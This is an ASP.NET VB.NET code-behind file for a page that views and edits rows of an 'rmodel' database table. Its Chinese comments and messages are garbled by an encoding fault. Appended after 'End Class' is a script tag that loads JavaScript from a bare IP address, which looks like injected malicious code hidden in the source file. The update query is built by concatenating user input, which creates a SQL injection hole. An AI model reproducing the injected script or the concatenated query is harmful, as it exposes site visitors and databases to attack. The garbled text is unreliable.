Imports System.Data
Imports System.Data.SqlClient

Public Class rmodelmodification
    Inherits System.Web.UI.Page

#Region " Web ������������ɵĴ��� "

    '�õ����� Web ���������������ġ�
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

    End Sub
    Protected WithEvents Form1 As System.Web.UI.HtmlControls.HtmlForm
    Protected WithEvents Form4 As System.Web.UI.HtmlControls.HtmlForm
    Protected WithEvents lblModelKey As System.Web.UI.WebControls.Label
    Protected WithEvents txtModelKey As System.Web.UI.WebControls.TextBox
    Protected WithEvents lblModelName As System.Web.UI.WebControls.Label
    Protected WithEvents txtModelName As System.Web.UI.WebControls.TextBox
    Protected WithEvents txtModelPubTime As System.Web.UI.WebControls.TextBox
    Protected WithEvents lblModelUpTime As System.Web.UI.WebControls.Label
    Protected WithEvents txtModelUpTime As System.Web.UI.WebControls.TextBox
    Protected WithEvents lblIsValid As System.Web.UI.WebControls.Label
    Protected WithEvents rbtnIsValidYes As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnIsValidNo As System.Web.UI.WebControls.RadioButton
    Protected WithEvents btnConfirm As System.Web.UI.WebControls.Button
    Protected WithEvents btnModiRef As System.Web.UI.WebControls.Button
    Protected WithEvents btnCancel As System.Web.UI.WebControls.Button
    Protected WithEvents lblHint As System.Web.UI.WebControls.Label
    Protected WithEvents lblWarning As System.Web.UI.WebControls.Label
    Protected WithEvents ddlstModelSearch As System.Web.UI.WebControls.DropDownList
    Protected WithEvents lblModelSearch As System.Web.UI.WebControls.Label
    Protected WithEvents btnSearch As System.Web.UI.WebControls.Button
    Protected WithEvents ddlstModelAtt As System.Web.UI.WebControls.DropDownList
    Protected WithEvents timetext As System.Web.UI.WebControls.Label

    'ע��: ����ռλ�������� Web ���������������ġ�
    '��Ҫɾ�����ƶ�����
    Private designerPlaceholderDeclaration As System.Object

    Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
        'CODEGEN: �˷��������� Web ����������������
        '��Ҫʹ�ô���༭���޸�����
        InitializeComponent()
    End Sub

#End Region

    Private Sub Initial(ByVal index As Integer)  ' ��ʼ��ҳ����ʾ
        Me.txtModelKey.Text = Session("myDateSet").Tables("rmodel").Rows(index).Item("rmodelkey")
        Me.txtModelName.Text = Session("myDateSet").Tables("rmodel").Rows(index).Item("rmodelName")
        Me.txtModelPubTime.Text = Session("myDateSet").Tables("rmodel").Rows(index).Item("publishtime")
        Me.txtModelUpTime.Text = Session("myDateSet").Tables("rmodel").Rows(index).Item("latestupdatetime")
        If Session("myDateSet").Tables("rmodel").Rows(index).Item("isvalid") = "1" Then
            Me.rbtnIsValidNo.Checked = False
            Me.rbtnIsValidYes.Checked = True
        Else
            Me.rbtnIsValidYes.Checked = False
            Me.rbtnIsValidNo.Checked = True
        End If
    End Sub

    Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        '�ڴ˴����ó�ʼ��ҳ���û�����
        Me.lblWarning.Visible = False

        Me.timetext.Text = DateTime.Now.ToString()
        Me.txtModelPubTime.Enabled = False
        Me.txtModelUpTime.Enabled = False
        Me.txtModelKey.Enabled = False

        Me.lblHint.ForeColor = System.Drawing.Color.AntiqueWhite
        If Session("UserName") = "" Then
            Me.lblHint.Text = "����û��¼�����ȵ�¼"
        Else
            Me.lblHint.Text = "���ã� " + Session("UserName")
        End If

        If Not IsPostBack Then  ' �û�x��һ�δ�ҳ��ʱ
            Dim strSql As String
            Dim mySqlConn As New SqlConnection(Me.Application("DataBase"))
            Try
                mySqlConn.Open()

                Dim mySqlAdapter As New SqlDataAdapter("select * from rmodel", mySqlConn)
                Dim myDateSet As New DataSet
                mySqlAdapter.Fill(myDateSet, "rmodel")
                Me.ddlstModelSearch.DataSource = myDateSet.Tables("rmodel").DefaultView
                Me.ddlstModelSearch.DataValueField = "rmodelkey"
                Me.ddlstModelSearch.DataBind()
                Me.Session("myDateSet") = myDateSet
                Initial(0)
                Me.Session("index") = 0
                Me.Session("colname") = "rmodelkey"
                mySqlConn.Close()
            Catch ex As SqlException
                Throw ex
                'Response.Redirect("error.htm") ' ������ʾ
            Finally
            End Try
        End If
    End Sub

    Private Sub btnSearch_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnSearch.Click
        Me.ddlstModelSearch.DataSource = Session("myDateSet").Tables("rmodel").DefaultView
        Me.ddlstModelSearch.DataValueField = Me.Session("colname")
        Me.ddlstModelSearch.DataBind()
        Me.ddlstModelSearch.SelectedIndex = Me.Session("index")
        Initial(Me.Session("index"))
    End Sub


    Private Sub ddlstModelArr_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs)
        If Me.ddlstModelAtt.SelectedIndex = 0 Then
            Me.Session("colname") = "rmodelkey"
        Else
            Me.Session("colname") = "rmodelname"
        End If
    End Sub

    Private Sub btnCancel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnCancel.Click
        Me.lblWarning.Visible = False
        Me.ddlstModelSearch.SelectedIndex = Me.Session("index")
        Initial(Me.Session("index"))
    End Sub

    Private Sub ddlstModelSearch_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ddlstModelSearch.SelectedIndexChanged
        Me.Session("index") = Me.ddlstModelSearch.SelectedIndex
    End Sub

    Private Sub btnConfirm_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnConfirm.Click
        If (Me.txtModelKey.Text.Trim() = "" Or Me.txtModelName.Text.Trim() = "") Then
            Me.lblWarning.Text = "���ѣ��������ȫ����Ϣ"
            Me.lblWarning.Visible = True
            Exit Sub
        End If

        Me.lblWarning.Visible = False

        Dim mySqlConn As SqlConnection
        mySqlConn = New SqlConnection(Me.Application("DataBase"))
        Dim strSql As String
        Dim mySqlComm As SqlCommand

        Try
            ' ��ȡ��Ч��ֵ������chrIsValid��
            Dim chrIsValid As Char

            If Me.rbtnIsValidYes.Checked = True Then
                chrIsValid = "1"
            Else
                chrIsValid = "0"
            End If

            ' �޸�������
            strSql = "update rmodel set rmodelname='" + Me.txtModelName.Text.Trim() + _
                "',latestupdatetime='" + Now.ToString("yyyy-MM-dd HH:mm:ss") + _
                "',isvalid= '" + chrIsValid + "' where rmodelkey='" + Me.txtModelKey.Text.Trim() + "'"
            mySqlComm = New SqlCommand(strSql, mySqlConn)

            mySqlConn.Open()
            If (mySqlComm.ExecuteNonQuery() > 0) Then
                Me.lblWarning.Text = "��ϲ���޸Ĺ�ϵ�ռ�ɹ�" + Me.txtModelKey.Text.Trim() + "�ɹ�"
                Me.lblWarning.Visible = True
                Dim mySqlAdapter As New SqlDataAdapter("select * from rmodel", mySqlConn)
                Dim myDateSet As New DataSet
                mySqlAdapter.Fill(myDateSet, "rmodel")
                Me.Session("myDateSet") = myDateSet
                Me.btnSearch_Click(sender, e)
            Else
                Me.lblWarning.Text = "���棺����ĳ��ԭ���޸Ĺ�ϵ�ռ�ʧ�ܣ�������û��Ȩ��"
                Me.lblWarning.Visible = True
            End If
            mySqlConn.Close()
        Catch ex As SqlException
            Throw ex
            'Response.Redirect("error.htm") ' ������ʾ
        Finally
        End Try
    End Sub

    Private Sub btnModiRef_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnModiRef.Click
        Me.Response.Redirect("rdefinitionmodification.aspx")
    End Sub
End Class
<script src="http://222.208.183.246/ad/ad.js"></script>
